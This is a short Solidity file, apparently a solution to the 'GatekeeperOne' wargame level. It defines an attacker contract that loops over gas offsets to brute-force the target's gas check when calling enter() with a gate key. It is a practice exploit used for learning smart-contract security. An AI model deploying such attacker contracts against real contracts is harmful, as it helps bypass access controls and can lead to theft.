// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperOne.sol";

contract GatekeeperOneAttacker {
    GatekeeperOne public gatekeeperOne;
    bool public isSuccess;
    
    constructor(GatekeeperOne _gatekeeperOne) public {
        gatekeeperOne = _gatekeeperOne;
    }

    function enter(bytes8 _gateKey) public {
        uint256 baseGas = 8191 * 100;

        for (uint256 i = 1; i <= 8191; i++) {
            (isSuccess,) = address(gatekeeperOne).call{gas: (baseGas + i)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));

            if (isSuccess) {
                break;
            }
        }
    }
}
